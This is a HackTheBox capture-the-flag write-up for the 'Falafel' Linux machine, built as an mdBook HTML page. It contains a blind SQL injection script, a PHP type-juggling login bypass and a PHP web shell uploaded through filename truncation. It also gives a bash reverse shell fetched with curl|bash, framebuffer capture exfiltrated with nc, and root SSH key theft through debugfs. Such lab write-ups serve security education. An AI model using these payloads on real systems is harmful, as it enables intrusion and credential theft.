@@ -1,0 +1,435 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js dark">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>HTB-Linux-Hard-Falafel - WriteUp HackTheBox - by JavaliMZ</title>
+        <!-- Custom HTML head -->
+<!-- Content here gets appended to the <html><head> of all the pages -->
+<!-- Custom HTML head: Twitter support -->
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/css/additional.css">
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('dark')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item "><a href="HTB-Windows-Easy-Omni.html">HTB-Windows-Easy-Omni</a></li><li class="chapter-item expanded "><a href="HTB-Linux-Hard-Falafel.html" class="active">HTB-Linux-Hard-Falafel</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">WriteUp HackTheBox - by JavaliMZ</h1>
+
+                    <div class="right-buttons">
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><img src="Assets/HTB-Linux-Hard-Falafel/f9106389d256a42cf41619e85fbd8f01.webp" alt="" /></p>
+<h2 id="testing"><a class="header" href="#testing">Testing</a></h2>
+<h1 id="writeup-of-falafel"><a class="header" href="#writeup-of-falafel">Writeup of <em>Falafel</em></a></h1>
+<h4 id="hard-machine-hacktheboxcom"><a class="header" href="#hard-machine-hacktheboxcom">Hard machine (hackthebox.com)</a></h4>
+<h4 id="sylvain-javali-júlio---08092021"><a class="header" href="#sylvain-javali-júlio---08092021">Sylvain (Javali) Júlio - 08/09/2021</a></h4>
+<hr />
+<hr />
+<h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
+<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
+<p>For enumeration, after verifying the connection, I always do a nmap scan like this:</p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/allPorts.png" alt="allPorts" /></p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/nmap-A.png" alt="nmap-A" /></p>
+<p>We have only ssh and 1 http port. The version of ssh have not big vulnerabilities, so the target is the port 80</p>
+<h2 id="website"><a class="header" href="#website">WebSite</a></h2>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/website-1.png" alt="Website - First page" /></p>
+<p>This site give some information. We have a email (IT@falafel.htb) and with this email, we can suspect potential user (IT) and virtual hosting (falafel.htb). let add this host on /etc/hosts</p>
+<pre><code class="language-bash">echo -e &quot;10.10.10.73\tfalafel.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<h3 id="fuzzing-the-website"><a class="header" href="#fuzzing-the-website">Fuzzing the website</a></h3>
+<p>The first fuzzing i do is for the website</p>
+<pre><code class="language-bash">ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r
+
+#&gt;  assets                  [Status: 403, Size: 293, Words: 22, Lines: 12]
+#&gt;  css                     [Status: 403, Size: 290, Words: 22, Lines: 12]
+#&gt;  js                      [Status: 403, Size: 289, Words: 22, Lines: 12]
+#&gt;  uploads                 [Status: 403, Size: 294, Words: 22, Lines: 12]
+#&gt;  images                  [Status: 403, Size: 293, Words: 22, Lines: 12]
+						#&gt;  [Status: 200, Size: 7203, Words: 774, Lines: 110]
+#&gt;  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
+</code></pre>
+<p>We can see and uploads directory. But nothing more... keep searching...</p>
+<p>The second scan i want to do is for discovery possibles files! We have the information that is an apache with &quot;whatweb http://falafel.htb&quot; and the login button redirect us to a login.php. We can try to find files with php extentions. But we can add txt too</p>
+<pre><code class="language-bash">ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r -e .txt,.php
+
+#&gt;  profile.php             [Status: 200, Size: 7063, Words: 878, Lines: 103]
+#&gt;  uploads                 [Status: 403, Size: 294, Words: 22, Lines: 12]
+#&gt;  header.php              [Status: 200, Size: 288, Words: 10, Lines: 18]
+#&gt;  footer.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
+#&gt;  upload.php              [Status: 200, Size: 7063, Words: 878, Lines: 103]
+#&gt;  css                     [Status: 403, Size: 290, Words: 22, Lines: 12]
+#&gt;  style.php               [Status: 200, Size: 6174, Words: 690, Lines: 69]
+#&gt;  index.php               [Status: 200, Size: 7203, Words: 774, Lines: 110]
+#&gt;  js                      [Status: 403, Size: 289, Words: 22, Lines: 12]
+#&gt;  login.php               [Status: 200, Size: 7063, Words: 878, Lines: 103]
+#&gt;  logout.php              [Status: 200, Size: 7063, Words: 878, Lines: 103]
+#&gt;  robots.txt              [Status: 200, Size: 30, Words: 3, Lines: 2]
+#&gt;  assets                  [Status: 403, Size: 293, Words: 22, Lines: 12]
+#&gt;  images                  [Status: 403, Size: 293, Words: 22, Lines: 12]
+#&gt;  cyberlaw.txt            [Status: 200, Size: 804, Words: 106, Lines: 18]
+#&gt;  connection.php          [Status: 200, Size: 0, Words: 1, Lines: 1]
+#&gt;  .php                    [Status: 403, Size: 290, Words: 22, Lines: 12]
+#&gt;                          [Status: 200, Size: 7203, Words: 774, Lines: 110]
+#&gt;  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
+
+</code></pre>
+<p>Whats is cyberlaw.txt?!</p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/cyberlaw.png" alt="cyberlaw.txt" /></p>
+<p>That give us a lot of potential information...</p>
+<ul>
+<li>Users devs and lawyers with &quot;To: lawyers@falafel.htb, devs@falafel.htb&quot;</li>
+<li>User &quot;chris&quot; and confirme &quot;admin&quot; user</li>
+</ul>
+<h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
+<p>After opening http://falafel.htb/ from the browser, we have a button login. if with put &quot;admin&quot; &quot;admin&quot; for user and password, we get an error &quot;Wrong identification : admin&quot;. Another random username give us &quot;Try again..&quot;. We can assume that the user &quot;admin&quot; existe.</p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/admin-login-try.png" alt="admin login try" /></p>
+<p>If we put user &quot;' or 1=1 -- -&quot; and password &quot;' or 1=1 -- -&quot;, we get the same error &quot;Wrong identification : admin&quot;. Maybe it is vulnerable to SQLi.</p>
+<p>If we put user &quot;admin' and sleep(5)&quot; and random password, we got this error &quot;Hacking Attempt Detected!&quot;. After some try, we know what is happening. The website blocks keywords. If username or password contain the words &quot;sleep&quot; or &quot;union&quot;, we got the hacking error.</p>
+<p>We can supose de username and password field exist, and can try this:</p>
+<pre><code class="language-txt">admin' and substring(username,1,1)='a'-- -
+</code></pre>
+<p>That code give us the same result (Wrong identification : admin) but if we change de 'a', we got (Try again..)</p>
+<pre><code class="language-txt">admin' and substring(username,2,1)='d'-- -
+</code></pre>
+<p>For de second char, if we put a 'd', we got (Wrong identification : admin) and we got (Try again..) if we put another char. if we change <em>&quot;substring(username,1,1)&quot;</em> for <em>&quot;substring(password,1,1)&quot;</em>, we can enumerate all chars of password field with the same method. So i made a python script for discover the hash password of users &quot;admin&quot; and &quot;chris&quot; (the only 2 know valid username):</p>
+<pre><code class="language-python">import requests
+import re
+from pwn import log
+
+
+def sendRequest(code):
+	url = &quot;http://falafel.htb/login.php&quot;
+	header = {&quot;Cookie&quot;: &quot;PHPSESSID=0tpuo9bnh5jo18ibamo44q3ej0&quot;}
+	data = {&quot;username&quot;: code, &quot;password&quot;: &quot;password&quot;}
+
+	res = requests.post(url, headers=header, data=data).text
+	res = res.replace(&quot;\n&quot;, &quot; &quot;).replace(&quot;\t&quot;, &quot; &quot;)
+	regexPattern = r&quot;&lt;br&gt;(.*?)&lt;/br&gt;&quot;
+	res = re.findall(regexPattern, res)[0].strip()
+	return res
+
+
+def getPassword(username):
+	l1 = log.progress(username)
+	password = &quot;&quot;
+	chars = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;
+	continueSearching = True
+	for position in range(1, 100):
+		if continueSearching:
+			for char in chars:
+				code = f&quot;{username}' and substring(password,{position},1)='{char}'-- -&quot;
+				if &quot;Wrong identification&quot; in sendRequest(code):
+					password += char
+					l1.status(password)
+					break
+				if char == &quot;z&quot;:
+					continueSearching = False
+
+
+def main():
+	getPassword(&quot;chris&quot;)
+	getPassword(&quot;admin&quot;)
+
+
+main()
+</code></pre>
+<p>The script give us 2 hashes:</p>
+<ul>
+<li>chris: d4ee02a22fc872e36d9e3751ba72ddc8</li>
+<li>admin: 0e462096931906507119562988736854</li>
+</ul>
+<p>with online tool called crackstation.net, we got 1 password:</p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/Crackstation.png" alt="crack station" /></p>
+<blockquote>
+<p>chris:juggling</p>
+</blockquote>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/login_chris.png" alt="Login Chris" /></p>
+<p>The Chris perfile have a tip. <em>TYPE-JUGGLING</em></p>
+<p>The admin hash is 0e462096931906507119562988736854. in php, the string &quot;0e462096931906507119562988736854&quot; == 0 (or &quot;0&quot; or every md5 hash who as &quot;0e{numbers...}&quot;) cause php interprete that 0e{numbers...} like 0 * (10 ^ {numbers...}) and, if the comparison is done with the loose comparisons &quot;==&quot; instead of the strict comparisons &quot;===&quot;, we can bypass the password with every strings that the hash is 0e{numbers...}. On the internet, we can found a lot of md5 hashes who result in 0e{numbers...}. I will try login with &quot;NWWKITQ&quot;</p>
+<blockquote>
+<p>admin:NWWKITQ (Not the real password, just juggling bypass)</p>
+</blockquote>
+<p>I am in!</p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/login_admin.png" alt="logged as admin" /></p>
+<h3 id="rce"><a class="header" href="#rce">RCE</a></h3>
+<p>At this point, we can try to upload a file. The box suggests a png file.</p>
+<pre><code class="language-bash">sudo python3 -m http.server 80
+</code></pre>
+<p>We can update an image with png extention. but the response is very unusual. That's look the website use &quot;wget&quot; binary for download the file. I tried change extension, MIME type, concate a command (because the server use wget) but nothing work... The way to upload is very tricky! In linux, the maximum size of a name file is 255 chars. And wget as a function that cute the name if is very long!!</p>
+<pre><code class="language-bash"># Copy the real image with 251 pattern char and last 4 chars as .png (255 chars)
+cp shell.png $(msf-pattern_create -l 251).png  
+</code></pre>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/output_wget.png" alt="Output wget" /></p>
+<p>The Output say literally the last 4 chars of the new name file is h7Ah</p>
+<pre><code class="language-bash">msf-pattern_offset -q h7Ah
+#&gt;  [*] Exact match at offset 232
+</code></pre>
+<p>Create a new file named shell.php:</p>
+<pre><code class="language-php">&lt;?php
+	echo &quot;\nURL Shell... url?cmd=&lt;command&gt;\n\n&quot;;
+	echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</code></pre>
+<p>We know:</p>
+<ul>
+<li>The file need to end with &quot;.png&quot; extension</li>
+<li>The site will interprete php code</li>
+<li>the wget of the server cut name too long and the exact offset was 232
+So, we need a file with 228 char + .php + .png (for delete .png too long, and save the file pas .php)</li>
+</ul>
+<pre><code class="language-bash">cp shell.php $(msf-pattern_create -l 232).php.png
+</code></pre>
+<p>In upload page, get the file and save the output...</p>
+<blockquote>
+<p>http://10.10.14.17/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png</p>
+</blockquote>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/good_upload.png" alt="uploaded web shell" /></p>
+<p>Note the path of the file and go to the webshell</p>
+<blockquote>
+<p>http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=whoami</p>
+</blockquote>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/whoami_web_shell.png" alt="whoami web shell" /></p>
+<p>We Have Remote Code Execution!</p>
+<h3 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h3>
+<p>Create a file names rev.html with the follow content:</p>
+<pre><code class="language-bash">#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.14.17/443 0&gt;&amp;1
+</code></pre>
+<p>Then, share a http server and with RCE on website, curl him, and execute him</p>
+<pre><code class="language-bash">sudo python3 -m http.server 80  # On one terminal
+sudo nc -lvnp 443               # On another one
+</code></pre>
+<blockquote>
+<p>http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=curl%20http://10.10.14.17/rev.html|bash</p>
+</blockquote>
+<h2 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h2>
+<p>We found credentials on /var/www/html/connection.php</p>
+<pre><code class="language-bash">(remote) www-data@falafel:/var/www/html$ cat connection.php
+&lt;?php
+   define('DB_SERVER', 'localhost:3306');
+   define('DB_USERNAME', 'moshe');
+   define('DB_PASSWORD', 'falafelIsReallyTasty');
+   define('DB_DATABASE', 'falafel');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+   // Check connection
+   if (mysqli_connect_errno())
+   {
+      echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();
+   }
+?&gt;
+</code></pre>
+<p>This credentials is for mysql. but if we try to logon as moshe:falafelIsReallyTasty, we will get in.</p>
+<h3 id="group-video"><a class="header" href="#group-video">Group video</a></h3>
+<p>This machine's is a ctf lool. But is interessante the way to escalate privilege. This machine are no more vulnerability... The password is on the screen of the machine. So, how we can screenshot this?</p>
+<p>with &quot;w&quot; command we can see the user yossi is logged physically on the machine</p>
+<pre><code class="language-bash">w
+#&gt;   22:31:32 up 10:23,  2 users,  load average: 0.00, 0.00, 0.00
+#&gt;  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+#&gt;  yossi    tty1                      12:08   10:22m  0.06s  0.06s -bash
+#&gt;  moshe    pts/1    10.10.14.17      22:06    0.00s  0.06s  0.00s w
+</code></pre>
+<p>The video group has access to view the screen output. Basically you can observe the the screens. In order to do that you need to grab the current image on the screen in raw data and get the resolution that the screen is using. The screen data can be saved in /dev/fb0 and you could find the resolution of this screen on /sys/class/graphics/fb0/virtual_size</p>
+<pre><code class="language-bash">cat /dev/fb0 &gt; /tmp/screen.raw
+cat /sys/class/graphics/fb0/virtual_size
+#&gt; 1176,885
+</code></pre>
+<p>Download the screen.raw into kali machine</p>
+<pre><code class="language-bash">nc 10.10.14.17 443 &lt; /tmp/screen.raw  # Target Machine
+nc -lvnp 443 &gt; screen.raw             # kali Machine
+</code></pre>
+<p>open with GIMP in mode RAW</p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/Openning_raw_image.png" alt="opennig image raw format with GIMP" /></p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/select_size_raw_image.png" alt="Select size of raw image" /></p>
+<p><img src="Assets/HTB-Linux-Hard-Falafel/yossi_password.png" alt="Password yossi" /></p>
+<p>We can now ssh into target machine with yossi user</p>
+<h3 id="group-disk"><a class="header" href="#group-disk">Group disk</a></h3>
+<pre><code class="language-bash">for group in $(groups); do echo -e &quot;\n\n\n[*] Archive with group $group permition:\n&quot;; find / -group $group 2&gt;/dev/null; done
+</code></pre>
+<p>When we run this, we see yossi have permition on /dev/sda1 and more...</p>
+<pre><code class="language-bash">fdisk -l
+#&gt;  Disk /dev/sda: 8 GiB, 8589934592 bytes, 16777216 sectors
+#&gt;  Units: sectors of 1 * 512 = 512 bytes
+#&gt;  Sector size (logical/physical): 512 bytes / 512 bytes
+#&gt;  I/O size (minimum/optimal): 512 bytes / 512 bytes
+#&gt;  Disklabel type: dos
+#&gt;  Disk identifier: 0x01590ad6
+#&gt;  
+#&gt;  Device     Boot    Start      End  Sectors  Size Id Type
+#&gt;  /dev/sda1  *        2048 14680063 14678016    7G 83 Linux
+#&gt;  /dev/sda2       14682110 16775167  2093058 1022M  5 Extended
+#&gt;  /dev/sda5       14682112 16775167  2093056 1022M 82 Linux swap / Solaris
+
+
+ll /dev/sda1
+#&gt;  brw-rw---- 1 root disk 8, 1 Sep  9 12:08 /dev/sda1
+</code></pre>
+<p>Group disk can read and write on /dev/sda1. But how?</p>
+<h3 id="debugfs"><a class="header" href="#debugfs">debugfs</a></h3>
+<p>debugfs - ext2/ext3/ext4 file system debugger. Display or manipulate a disk partition table. We can see easily the flag, but we want to be root!</p>
+<pre><code class="language-bash">debugfs /dev/sda1
+debugfs: cd /root/.ssh
+debugfs: cat id_rsa  # copy the content...
+# Exit the debugfs
+
+cd /tmp
+nano id_rsa  # paste the content...
+chmod 600 id_rsa
+ssh -i id_rsa root@localhost
+
+
+cat /home/moshe/user.txt
+#&gt; c866575ed5999e1a878b1494fcb1f9d3
+cat /root/root.txt
+#&gt; 23b79200448c62ffd6f8f2091c001fa1
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="HTB-Windows-Easy-Omni.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="HTB-Windows-Easy-Omni.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
